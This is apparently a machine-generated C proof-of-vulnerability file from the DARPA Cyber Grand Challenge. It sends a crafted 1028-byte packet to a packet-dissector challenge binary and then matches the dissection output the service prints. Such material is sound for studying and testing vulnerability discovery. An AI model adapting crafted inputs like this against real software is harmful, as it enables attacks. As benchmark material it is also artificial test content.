#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x3b\xec\xa0\x1c"
         "\x79\xda\x29\xac\x00\xb3\xd2\x0d\x5e\x7b\xbe\x07\x9e\x21\x51\x64"
         "\xc8\x01\x00\x00\xcf\xbf\x99\xe7\xc2\x94\xe0\x24\x80\x4a\xe5\xc7"
         "\x38\xd8\xd6\x01\x3a\x21\xcc\xb7\x52\x76\xb7\xb9\xc5\x78\x93\x0e"
         "\xfe\x80\xb7\xfb\xc7\xfa\x69\x3b\x03\x1f\xa6\xea\xc8\x5f\x09\x12"
         "\x3c\xc5\x49\x8d\x50\xb0\x0d\x7d\x69\x6e\xbe\x11\x0b\x4a\x10\xc7"
         "\xf6\xd1\x4e\x42\x6f\x52\xe4\xeb\xa6\xf7\xf9\xb5\xd2\x16\x1e\x12"
         "\xf7\x4d\xc9\x47\x5a\x2f\xb7\x21\x0c\x65\xde\x47\xeb\x74\x0c\x3b"
         "\x8e\x95\xe0\x72\xf8\xff\x92\x7f\x57\xff\xae\xec\x16\x3e\x47\x28"
         "\x39\x47\x81\xdc\xd9\x1e\xd3\x5e\xc5\xf5\xfd\x25\xa2\xe9\x2d\x33"
         "\xa0\xb6\x00\x00\xaf\x36\xdb\x70\x6e\xde\x7b\x1f\xea\x90\x85\x22"
         "\x58\x21\xf1\x8e\x95\xc4\x71\x37\xa4\xbe\x71\xbf\xd9\xb6\x84\xc1"
         "\x24\x24\x96\x7e\x59\x60\xfb\x56\x16\xe2\xff\x8b\xbf\x17\xf0\xab"
         "\x5a\x39\x2e\xf9\xdf\xe6\x76\x0b\x0e\x6c\x19\xce\xc5\x30\x58\xb6"
         "\x4e\xce\x94\x73\x3e\x00\x5c\x76\xf8\xce\x17\x66\x4c\xb1\xa8\x67"
         "\x3e\x00\x57\x0b\xbd\xc9\x99\x55\x9b\x62\x1e\x30\xd3\xec\xb0\xca"
         "\x98\xb4\x25\x49\xf7\x79\xaf\xf0\x1b\xf2\x56\x76\x82\x1a\x58\x2f"
         "\xc2\xa9\xa8\x08\x41\x02\xf6\xb4\x83\xeb\x2c\xc6\x58\x53\xf1\x9d"
         "\xc1\x33\x7f\x07\xa7\xe1\x15\x90\xba\xf1\x40\x99\xdb\xb9\x8d\x0d"
         "\x1e\xd8\xb6\xfa\x7f\xf0\x25\xe6\x2c\x89\x3f\x40\xa7\x91\x51\xda"
         "\x53\xba\x14\x04\x13\x05\xac\xfd\xf3\xbb\x53\xd4\x7a\xb8\x51\x7b"
         "\x02\xcb\x62\x71\x44\x36\x53\xc0\x74\x16\x86\x10\x71\xc4\x4a\xf8"
         "\x93\x41\x0d\xa3\x0a\x36\xa4\xa6\x85\xfb\x68\xe7\xbb\x07\xac\x18"
         "\x4c\xd4\xef\x32\xe2\xcf\x45\x22\xd3\x12\x92\x06\x66\x92\xf5\xed"
         "\x52\x1d\x98\x40\xbc\xcc\x36\x97\xd5\xfc\x58\x48\xcc\xb3\xf8\x96"
         "\x09\x6d\xf0\x23\x89\x5e\x15\xe2\x32\xae\xcc\x48\x81\x16\x0e\x3e"
         "\xac\x82\x02\x7d\xe2\xfa\x43\xf0\x65\x4a\x43\x63\xf3\xc6\xcb\xcf"
         "\x26\x85\xc7\x4d\x22\x56\x55\x4b\x22\xbe\x92\x72\x52\x31\x6c\x01"
         "\x80\xb3\xff\x2a\xad\x26\x18\xf1\xd1\xcc\xe6\xa4\xa1\xbf\x65\x76"
         "\x61\x78\x31\xd5\x96\x44\xb1\x58\x22\x7c\x1e\x99\x03\xa0\xdf\x78"
         "\x6b\x2d\x68\xc8\x40\x10\xaa\xd4\x7a\xcf\xe1\xd3\xbc\xe5\x16\x2b"
         "\xd2\xe5\xd9\xc6\xbc\xe0\xf6\x0a\xa3\x78\xe6\x9e\x58\xcf\xbd\x28"
         "\xa6\x5d\xc7\x1e\xe6\xb1\x16\x17\xb0\x88\x24\x4b\xcc\x1a\xe4\x67"
         "\x90\x6b\xa3\x42\x1d\xb2\x3f\xa1\xf2\xf7\x40\x6c\x89\x7a\x56\x49"
         "\x30\x2c\x5a\xfe\x1f\x0d\x3c\xbc\x2c\xf5\x8c\xed\xd0\xcb\xd0\xde"
         "\x49\x92\xc9\x7b\x82\xe8\x5d\x09\x8e\x07\x10\x76\x6a\x89\x3d\x9b"
         "\x0e\xbb\x1c\xd3\xea\xd0\x3e\xe9\xd1\xb8\x21\x9a\x4f\x6f\xc9\xec"
         "\xd4\xd8\xcc\x14\x04\xc2\x7a\x63\xf6\xce\x95\xf6\x4c\x22\x53\x77"
         "\x19\x67\x60\x2e\x0c\x68\x26\xb6\x80\x6a\xe0\x15\x9a\xa3\x12\xc6"
         "\x35\xd8\x23\x88\xbb\x15\x9a\xf0\xd2\x76\xed\x2d\x8b\xcc\x4e\x08"
         "\x2f\x12\x2c\x23\x93\x1d\xad\xab\xd7\xe2\xcd\x22\x9c\x24\xe3\x82"
         "\x6a\x56\x97\x9b\x8b\xc4\x4f\xbd\xdd\x20\xba\x37\x91\x79\x23\x56"
         "\xc4\x38\x90\x67\x8a\x6c\x9b\x90\xcb\x9f\x93\xf2\x87\x58\xb8\xdf"
         "\x28\x8c\x0a\xb7\x06\x28\x57\xa6\x45\x65\xc7\x27\x31\x2c\xc8\x44"
         "\x54\x50\x59\x65\xe4\x14\xf6\x03\xf7\xb6\x4b\xbf\x09\x40\x87\x0e"
         "\xb6\x3e\x92\x4e\x5b\x45\x8a\xc3\xec\xaa\x2b\x35\xcc\xd2\x00\x27"
         "\x2b\xac\xf7\xed\xf6\xb1\x75\xd4\x31\xe7\xa9\x50\x2a\xee\x61\x63"
         "\x40\x92\x2b\x6c\x18\x4e\x13\x23\x04\x21\xa7\x09\xaa\xbb\x35\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===hallowerhydrophthalmos
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x68\x61\x6c\x6c\x6f\x77\x65\x72\x68\x79\x64"
         "\x72\x6f\x70\x68\x74\x68\x61\x6c\x6d\x6f\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
